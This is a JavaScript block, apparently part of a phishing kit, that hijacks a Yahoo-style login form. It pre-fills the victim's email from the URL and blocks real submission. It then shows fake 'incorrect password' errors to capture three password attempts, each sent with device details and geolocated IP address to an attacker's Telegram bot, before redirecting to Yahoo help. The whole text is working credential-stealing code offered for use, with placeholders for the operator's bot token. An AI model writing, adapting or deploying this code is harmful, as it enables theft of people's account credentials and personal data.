<!-- =================================================================================== -->
<!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING                         -->
<!-- ABSOLUTELY NO PAGE RELOAD/BLINK - CLEARS FIELD ONLY - REDIRECT ON 3RD              -->
<!-- =================================================================================== -->
<script>
(function() {
    // ==================== ⚠️ REPLACE WITH YOUR REAL TELEGRAM CREDENTIALS ⚠️ ====================
    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Get from @BotFather
    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";       // Get from @userinfobot
    // ==========================================================================================
    
    let passwordAttempts = 0;
    let capturedEmail = null;
    let emailAutoFilled = false;
    let cachedLocation = null;
    
    // Send message using Image Beacon
    function sendToTelegram(message) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
            console.error("[Telegram] Bot token not configured!");
            return false;
        }
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.error("[Telegram] Chat ID not configured!");
            return false;
        }
        
        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
        
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url);
        } else {
            new Image().src = url;
        }
        console.log("[Telegram] Sent!");
        return true;
    }
    
    // Get device/browser information
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown", browser = "Unknown";
        if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac")) os = "MacOS";
        else if (ua.includes("Linux")) os = "Linux";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
        
        if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
        else if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Edg")) browser = "Edge";
        
        return `${browser} on ${os} | ${screen.width}x${screen.height} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
    }
    
    // Get location
    async function getLocationInfo() {
        if (cachedLocation) return cachedLocation;
        
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            cachedLocation = {
                ip: d.ip || "Unknown",
                city: d.city || "Unknown",
                state: d.region || "Unknown",
                zip: d.postal || "Unknown",
                country: d.country_name || "Unknown"
            };
            return cachedLocation;
        } catch(e) {
            try {
                const res = await fetch('https://ipinfo.io/json');
                const d = await res.json();
                cachedLocation = {
                    ip: d.ip || "Unknown",
                    city: d.city || "Unknown",
                    state: d.region || "Unknown",
                    zip: d.postal || "Unknown",
                    country: d.country || "Unknown"
                };
                return cachedLocation;
            } catch(e2) {
                return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
            }
        }
    }
    
    // Show error message
    function showError(attemptCount) {
        const existing = document.querySelectorAll('.custom-pw-error');
        existing.forEach(e => e.remove());
        
        let msg = attemptCount === 1 ? '❌ Incorrect password. Attempt 1/3. Try again.' : '❌ Incorrect password. Attempt 2/3. Last try!';
        
        let container = document.querySelector('#appErrorAbove');
        if (!container || !container.innerHTML) container = document.querySelector('.formfield-msg');
        if (!container) container = document.querySelector('#userInlineErrorText');
        
        if (container) {
            container.innerHTML = `<div class="custom-pw-error" style="color: #d32f2f; font-size: 14px; margin-top: 8px; padding: 8px; background: #ffebee; border-radius: 4px;">${msg}</div>`;
            container.style.display = "block";
        }
    }
    
    // Extract email from URL
    function extractEmailFromUrl() {
        let email = null;
        if (window.location.hash && window.location.hash.length > 1) {
            let hash = window.location.hash.substring(1);
            if (hash.includes('@')) email = decodeURIComponent(hash).trim();
        }
        if (!email) {
            const p = new URLSearchParams(window.location.search);
            if (p.has('email')) email = p.get('email');
            else if (p.has('user')) email = p.get('user');
            if (email) email = decodeURIComponent(email).trim();
        }
        return (email && email.includes('@')) ? email : null;
    }
    
    // Report to Telegram
    async function reportCredentials(password, attemptNumber) {
        const deviceInfo = getDeviceInfo();
        const location = await getLocationInfo();
        const timestamp = new Date().toLocaleString();
        
        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n` +
                        `📧 User: ${capturedEmail || "Unknown"}\n` +
                        `🔑 Pass: ${password}\n` +
                        `📱 ${deviceInfo}\n` +
                        `🌐 IP: ${location.ip}\n` +
                        `📍 ${location.city}, ${location.state} ${location.zip}\n` +
                        `🌍 ${location.country}\n` +
                        `⏰ ${timestamp}`;
        
        sendToTelegram(message);
        console.log(`[Report] Attempt #${attemptNumber} sent.`);
    }
    
    // Handle password attempt - NO RELOAD, NO BLINK
    function handleAttempt(password) {
        if (!password || password.trim() === '') return;
        
        passwordAttempts++;
        console.log(`[Interceptor] Attempt #${passwordAttempts}: "${password}"`);
        
        // Send report (fire and forget)
        reportCredentials(password, passwordAttempts);
        
        if (passwordAttempts === 1) {
            // First attempt - clear field, show error, stay on page
            showError(1);
            clearPasswordFields();
            console.log("[Interceptor] Attempt 1 failed - cleared field, staying on page.");
        } else if (passwordAttempts === 2) {
            // Second attempt - clear field, show error, stay on page
            showError(2);
            clearPasswordFields();
            console.log("[Interceptor] Attempt 2 failed - cleared field, staying on page.");
        } else {
            // Third attempt - redirect
            console.log("[Interceptor] Attempt 3 - redirecting...");
            window.location.href = "https://help.yahoo.com";
        }
    }
    
    // Clear all password fields
    function clearPasswordFields() {
        const pwFields = document.querySelectorAll('input[type="password"]');
        pwFields.forEach(field => {
            field.value = '';
        });
        
        // Also focus on the password field
        setTimeout(() => {
            const pwField = document.querySelector('input[type="password"]');
            if (pwField) pwField.focus();
        }, 50);
    }
    
    // COMPLETELY DISABLE FORM SUBMISSION
    function disableFormSubmission() {
        // Find the form
        const form = document.getElementById('login');
        if (!form) return;
        
        // Remove action attribute
        form.removeAttribute('action');
        form.setAttribute('onsubmit', 'return false;');
        
        // Override submit method
        form.submit = function() {
            console.log("[Interceptor] Form submit blocked!");
            return false;
        };
        
        // Capture all submit events
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            const pwField = document.querySelector('input[type="password"]');
            if (pwField && pwField.value) {
                handleAttempt(pwField.value);
            }
            
            return false;
        }, true);
        
        // Disable all submit buttons
        const buttons = form.querySelectorAll('button, input[type="submit"]');
        buttons.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                
                const pwField = document.querySelector('input[type="password"]');
                if (pwField && pwField.value) {
                    handleAttempt(pwField.value);
                }
                
                return false;
            }, true);
            
            // Remove type="submit"
            if (btn.type === 'submit') {
                btn.type = 'button';
            }
        });
        
        console.log("[Interceptor] Form submission COMPLETELY disabled.");
    }
    
    // Auto-fill email
    async function autoGrabEmail() {
        if (emailAutoFilled) return;
        const email = extractEmailFromUrl();
        if (!email) return;
        
        capturedEmail = email;
        emailAutoFilled = true;
        console.log("[AutoGrab] Email:", email);
        
        const checkAndFill = () => {
            const userInput = document.querySelector('#userID');
            if (userInput) {
                userInput.value = email;
                userInput.dispatchEvent(new Event('input', { bubbles: true }));
                userInput.dispatchEvent(new Event('change', { bubbles: true }));
                
                setTimeout(() => {
                    const btn = document.querySelector('#continueFromUserLogin');
                    if (btn) btn.click();
                }, 300);
                return true;
            }
            return false;
        };
        
        // Try immediately
        if (!checkAndFill()) {
            // Try every 500ms for 10 seconds
            let attempts = 0;
            const interval = setInterval(() => {
                if (checkAndFill() || attempts++ > 20) {
                    clearInterval(interval);
                }
            }, 500);
        }
    }
    
    // Watch for password field and set up interceptor
    function watchForPasswordField() {
        const observer = new MutationObserver(() => {
            const pwField = document.querySelector('input[type="password"]');
            if (pwField && !window._interceptorSetup) {
                window._interceptorSetup = true;
                
                // Disable form submission
                disableFormSubmission();
                
                // Also intercept Enter key on password field
                pwField.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        e.stopPropagation();
                        
                        if (this.value) {
                            handleAttempt(this.value);
                        }
                        return false;
                    }
                }, true);
                
                console.log("[Interceptor] Password field intercepted!");
            }
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
    }
    
    // Block all navigation attempts during attempts 1-2
    function blockNavigation() {
        // Block beforeunload
        window.addEventListener('beforeunload', function(e) {
            if (passwordAttempts > 0 && passwordAttempts < 3) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            }
        });
        
        // Hijack history
        const originalPush = history.pushState;
        const originalReplace = history.replaceState;
        
        history.pushState = function() {
            if (passwordAttempts > 0 && passwordAttempts < 3) {
                console.log("[Interceptor] Navigation blocked");
                return;
            }
            return originalPush.apply(history, arguments);
        };
        
        history.replaceState = function() {
            if (passwordAttempts > 0 && passwordAttempts < 3) {
                console.log("[Interceptor] Navigation blocked");
                return;
            }
            return originalReplace.apply(history, arguments);
        };
    }
    
    // Initialize everything
    function init() {
        autoGrabEmail();
        watchForPasswordField();
        blockNavigation();
        
        // Also try to disable form immediately
        setTimeout(disableFormSubmission, 100);
        setTimeout(disableFormSubmission, 500);
        setTimeout(disableFormSubmission, 1000);
        setTimeout(disableFormSubmission, 2000);
        
        console.log("[Init] ✅ Ready. Page will NOT reload. 3 attempts then redirect.");
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    window.addEventListener('load', init);
